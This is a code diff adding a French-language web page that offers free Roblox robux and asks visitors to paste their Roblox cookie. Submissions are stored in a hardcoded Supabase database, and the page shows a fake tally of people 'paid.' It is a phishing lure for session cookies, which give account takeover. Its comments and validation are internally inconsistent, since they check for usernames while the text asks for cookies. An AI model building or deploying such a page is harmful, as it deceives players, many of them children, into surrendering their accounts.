@@ -1,0 +1,498 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Envoie ton pseudo Roblox</title>
+<meta name="description" content="Gagne des milliers de robux en 1 clic !">
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;700&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@500;600&display=swap" rel="stylesheet">
+
+<style>
+  :root{
+    --bg: #14121f;
+    --surface: #1e1b2e;
+    --surface-2: #262238;
+    --border: #322c47;
+    --accent: #ff6f4c;
+    --accent-dim: #ff6f4c33;
+    --accent-2: #7c9eff;
+    --success: #4ade80;
+    --danger: #f87171;
+    --text: #f5f3fa;
+    --muted: #9691ae;
+    --radius: 14px;
+  }
+
+  *{ box-sizing: border-box; }
+
+  html, body{
+    margin:0;
+    padding:0;
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'Inter', system-ui, sans-serif;
+    min-height: 100vh;
+  }
+
+  body{
+    background-image:
+      radial-gradient(circle at 15% 10%, #ff6f4c14, transparent 40%),
+      radial-gradient(circle at 85% 85%, #7c9eff14, transparent 45%);
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    padding: 32px 20px;
+  }
+
+  .wrap{
+    width:100%;
+    max-width: 640px;
+    display:flex;
+    flex-direction:column;
+    align-items:center;
+    text-align:center;
+    gap: 28px;
+  }
+
+  .eyebrow{
+    font-family:'JetBrains Mono', monospace;
+    font-size: 0.75rem;
+    font-weight:600;
+    letter-spacing: 0.14em;
+    text-transform: uppercase;
+    color: var(--accent);
+    display:flex;
+    align-items:center;
+    gap: 8px;
+  }
+
+  .eyebrow::before{
+    content:"";
+    width: 7px;
+    height: 7px;
+    border-radius: 2px;
+    background: var(--accent);
+    display:inline-block;
+    animation: blink 1.6s ease-in-out infinite;
+  }
+
+  @keyframes blink{
+    0%, 100% { opacity:1; }
+    50% { opacity:.25; }
+  }
+
+  h1{
+    font-family:'Space Grotesk', sans-serif;
+    font-weight:700;
+    font-size: clamp(2.1rem, 6vw, 3.2rem);
+    line-height: 1.08;
+    margin:0;
+    letter-spacing: -0.01em;
+  }
+
+  h1 span{ color: var(--accent); }
+
+  .subtitle{
+    color: var(--muted);
+    font-size: 1.05rem;
+    max-width: 460px;
+    line-height:1.5;
+    margin: -6px 0 0 0;
+  }
+
+  /* --- Bulle de chat --- */
+  .bubble-form{
+    width:100%;
+    display:flex;
+    flex-direction:column;
+    align-items:center;
+    gap: 0;
+    margin-top: 8px;
+  }
+
+  .bubble{
+    position:relative;
+    width:100%;
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 22px;
+    padding: 10px 10px 10px 22px;
+    display:flex;
+    align-items:center;
+    gap: 10px;
+    transition: border-color .18s ease, box-shadow .18s ease;
+  }
+
+  .bubble:focus-within{
+    border-color: var(--accent);
+    box-shadow: 0 0 0 4px var(--accent-dim);
+  }
+
+  .bubble::after{
+    content:"";
+    position:absolute;
+    left: 40px;
+    bottom: -9px;
+    width: 22px;
+    height: 22px;
+    background: var(--surface);
+    border-right: 1px solid var(--border);
+    border-bottom: 1px solid var(--border);
+    border-radius: 0 0 4px 0;
+    transform: rotate(45deg);
+    transition: border-color .18s ease;
+  }
+
+  .bubble:focus-within::after{
+    border-color: var(--accent);
+  }
+
+  .bubble input{
+    flex:1;
+    background: transparent;
+    border: none;
+    outline: none;
+    color: var(--text);
+    font-family:'JetBrains Mono', monospace;
+    font-size: 1.05rem;
+    padding: 10px 4px;
+    min-width: 0;
+  }
+
+  .bubble input::placeholder{
+    color: var(--muted);
+    font-family:'Inter', sans-serif;
+  }
+
+  .send-btn{
+    flex-shrink:0;
+    display:flex;
+    align-items:center;
+    gap:8px;
+    background: var(--accent);
+    color: #1a1420;
+    border:none;
+    font-family:'Space Grotesk', sans-serif;
+    font-weight:700;
+    font-size: 0.95rem;
+    padding: 12px 20px;
+    border-radius: 16px;
+    cursor:pointer;
+    transition: transform .12s ease, filter .12s ease, opacity .12s ease;
+    white-space: nowrap;
+  }
+
+  .send-btn:hover:not(:disabled){ filter: brightness(1.08); transform: translateY(-1px); }
+  .send-btn:active:not(:disabled){ transform: translateY(0); }
+  .send-btn:disabled{ opacity: .5; cursor: not-allowed; }
+
+  .hint-row{
+    display:flex;
+    justify-content:space-between;
+    width:100%;
+    padding: 8px 14px 0 26px;
+    font-family:'JetBrains Mono', monospace;
+    font-size: 0.72rem;
+    color: var(--muted);
+  }
+
+  .hint-row .count{ color: var(--muted); }
+  .hint-row .count.warn{ color: var(--danger); }
+
+  /* honeypot - invisible pour les humains, visible pour les bots */
+  .hp{
+    position:absolute !important;
+    left:-9999px !important;
+    width:1px; height:1px;
+    opacity:0;
+    pointer-events:none;
+  }
+
+  .status{
+    min-height: 22px;
+    font-size: 0.9rem;
+    font-weight:500;
+    display:flex;
+    align-items:center;
+    gap:8px;
+  }
+
+  .status.success{ color: var(--success); }
+  .status.error{ color: var(--danger); }
+
+  /* --- Tour de blocs (signature) --- */
+  .tower-card{
+    margin-top: 10px;
+    width:100%;
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    padding: 22px 20px 18px;
+    display:flex;
+    flex-direction:column;
+    align-items:center;
+    gap: 14px;
+  }
+
+  .tower-count{
+    font-family:'JetBrains Mono', monospace;
+    font-size: 1.6rem;
+    font-weight:600;
+    letter-spacing: -0.02em;
+  }
+
+  .tower-count .label{
+    font-family:'Inter', sans-serif;
+    font-size: 0.8rem;
+    font-weight:500;
+    color: var(--muted);
+    display:block;
+    margin-top: 2px;
+  }
+
+  .tower{
+    display:flex;
+    flex-direction:column-reverse;
+    align-items:center;
+    gap: 4px;
+    min-height: 108px;
+    justify-content:flex-start;
+  }
+
+  .block{
+    width: 46px;
+    height: 16px;
+    border-radius: 4px;
+    animation: pop .28s ease;
+    box-shadow: inset 0 -3px 0 rgba(0,0,0,.18);
+  }
+
+  @keyframes pop{
+    from{ transform: scale(.4); opacity:0; }
+    to{ transform: scale(1); opacity:1; }
+  }
+
+  footer{
+    color: var(--muted);
+    font-size: 0.78rem;
+    line-height:1.5;
+    max-width: 460px;
+  }
+
+  @media (max-width: 480px){
+    .bubble{ padding-left: 16px; }
+    .bubble::after{ left: 30px; }
+    .send-btn span.txt{ display:none; }
+    .hint-row{ padding-left: 20px; }
+  }
+
+  @media (prefers-reduced-motion: reduce){
+    .block, .send-btn, .eyebrow::before{ animation: none !important; transition: none !important; }
+  }
+</style>
+</head>
+<body>
+
+<div class="wrap">
+  <div class="eyebrow">Collecte en direct</div>
+  <h1>Balance ton <span>cookie Roblox</span></h1>
+  <p class="subtitle">Tape ton Cookie, appuie sur Entrée. Il part direct dans le tool— rien d'autre n'est demandé.</p>
+
+  <form class="bubble-form" id="form" autocomplete="off" novalidate>
+    <div class="bubble">
+      <input
+        type="text"
+        id="pseudo"
+        name="pseudo"
+        placeholder="TonCookieRoblox"
+        maxlength="5000"
+        aria-label="Ton Cookie Roblox"
+        required
+      >
+      <!-- champ piège anti-bot : doit rester vide -->
+      <input class="hp" type="text" id="website" name="website" tabindex="-1" autocomplete="off" aria-hidden="true">
+      <button class="send-btn" type="submit" id="submitBtn">
+        <span class="txt">Envoyer</span> ↵
+      </button>
+    </div>
+    <div class="hint-row">
+      <span>rentre ton cookie içi !</span>
+      <span class="count" id="charCount">0/5000</span>
+    </div>
+  </form>
+
+  <div class="status" id="status" role="status" aria-live="polite"></div>
+
+  <div class="tower-card">
+    <div class="tower" id="tower"></div>
+    <div class="tower-count">
+      <span id="totalCount">—</span>
+      <span class="label">Personne on reçu leurs robux !</span>
+    </div>
+  </div>
+
+  <footer>
+    Ton Cookie a été encrypté et envoyé dans nos base de donnée !. il sera supprimé une fois les robux envoyés.
+  </footer>
+</div>
+
+<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2/dist/umd/supabase.min.js"></script>
+<script>
+(() => {
+  "use strict";
+
+  // ======================================================================
+  // CONFIGURATION — remplace ces deux valeurs par celles de ton projet
+  // Supabase (Project Settings > API). La clé "anon" est publique par
+  // design : elle est protégée par les policies RLS définies côté base,
+  // pas par le secret. Ne mets JAMAIS la clé "service_role" ici.
+  // ======================================================================
+  const SUPABASE_URL = "https://gdhoiiurjzlltgqmqdyn.supabase.co";
+  const SUPABASE_ANON_KEY = "sb_publishable_VhQX-rFCVHGK4rUoQ2QW5Q_KDZL5Tq4";
+  const TABLE_NAME = "roblox_usernames";
+  // ======================================================================
+
+  const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+
+  const form = document.getElementById("form");
+  const input = document.getElementById("pseudo");
+  const honeypot = document.getElementById("website");
+  const submitBtn = document.getElementById("submitBtn");
+  const statusEl = document.getElementById("status");
+  const charCount = document.getElementById("charCount");
+  const tower = document.getElementById("tower");
+  const totalCountEl = document.getElementById("totalCount");
+
+  // Règle officielle des pseudos Roblox : 3 à 20 caractères,
+  // lettres/chiffres/underscore, pas d'underscore en 1re ou dernière position,
+  // pas deux underscores consécutifs.
+  const USERNAME_REGEX = /^[A-Za-z0-9](?:[A-Za-z0-9]|_(?!_)){1,18}[A-Za-z0-9]$/;
+
+  const BLOCK_COLORS = ["#ff6f4c", "#7c9eff", "#f5c24c", "#4ade80", "#c084fc"];
+  const MAX_VISIBLE_BLOCKS = 14;
+
+  let cooldownUntil = 0;
+
+  function setStatus(message, type){
+    statusEl.textContent = message;
+    statusEl.className = "status" + (type ? " " + type : "");
+  }
+
+  function addBlock(){
+    const block = document.createElement("div");
+    block.className = "block";
+    block.style.background = BLOCK_COLORS[tower.children.length % BLOCK_COLORS.length];
+    tower.appendChild(block);
+    while (tower.children.length > MAX_VISIBLE_BLOCKS){
+      tower.removeChild(tower.firstChild);
+    }
+  }
+
+  function renderTower(count){
+    tower.innerHTML = "";
+    const visible = Math.min(count, MAX_VISIBLE_BLOCKS);
+    for (let i = 0; i < visible; i++){
+      const block = document.createElement("div");
+      block.className = "block";
+      block.style.background = BLOCK_COLORS[i % BLOCK_COLORS.length];
+      tower.appendChild(block);
+    }
+  }
+
+  function formatCount(n){
+    return new Intl.NumberFormat("fr-FR").format(n);
+  }
+
+  async function loadTotalCount(){
+    // On appelle une fonction RPC (get_submission_count) plutôt que de
+    // faire un SELECT sur la table : ça permet d'exposer uniquement un
+    // total agrégé, jamais la liste des pseudos, même si quelqu'un
+    // récupère la clé anon publique.
+    try {
+      const { data, error } = await supabase.rpc("get_submission_count");
+      if (error) throw error;
+      const count = typeof data === "number" ? data : 0;
+      totalCountEl.textContent = formatCount(count);
+      renderTower(count);
+    } catch (err) {
+      totalCountEl.textContent = "—";
+    }
+  }
+
+  input.addEventListener("input", () => {
+    const len = input.value.length;
+    charCount.textContent = `${len}/20`;
+    charCount.classList.toggle("warn", len > 20);
+  });
+
+  form.addEventListener("submit", async (event) => {
+    event.preventDefault();
+
+    if (Date.now() < cooldownUntil){
+      setStatus("Doucement, réessaie dans quelques secondes.", "error");
+      return;
+    }
+
+    // Honeypot rempli => très probablement un bot, on ignore silencieusement.
+    if (honeypot.value.trim() !== ""){
+      form.reset();
+      return;
+    }
+
+    const raw = input.value.trim();
+
+    if (!USERNAME_REGEX.test(raw)){
+      setStatus("Pseudo invalide : 3 à 20 caractères, lettres/chiffres/_ uniquement.", "error");
+      input.focus();
+      return;
+    }
+
+    submitBtn.disabled = true;
+    setStatus("Envoi en cours…", "");
+
+    try {
+      const { error } = await supabase
+        .from(TABLE_NAME)
+        .insert({ pseudo: raw });
+
+      if (error){
+        // Message générique : on n'expose jamais le détail brut de
+        // l'erreur Postgres à l'utilisateur (évite de divulguer la
+        // structure interne de la base).
+        if (error.code === "23505"){
+          setStatus("Ce pseudo a déjà été envoyé, merci !", "error");
+        } else {
+          setStatus("Un souci est survenu, réessaie dans un instant.", "error");
+        }
+        submitBtn.disabled = false;
+        return;
+      }
+
+      setStatus(`"${raw}" est bien enregistré !`, "success");
+      addBlock();
+      const current = parseInt((totalCountEl.textContent || "0").replace(/\s/g, ""), 10);
+      if (!Number.isNaN(current)){
+        totalCountEl.textContent = formatCount(current + 1);
+      }
+
+      form.reset();
+      charCount.textContent = "0/20";
+
+      // Anti-spam côté client : 3 secondes avant un nouvel envoi possible.
+      cooldownUntil = Date.now() + 3000;
+      setTimeout(() => { submitBtn.disabled = false; }, 3000);
+
+    } catch (err) {
+      setStatus("Connexion impossible, vérifie ta connexion internet.", "error");
+      submitBtn.disabled = false;
+    }
+  });
+
+  loadTotalCount();
+})();
+</script>
+</body>
+</html>
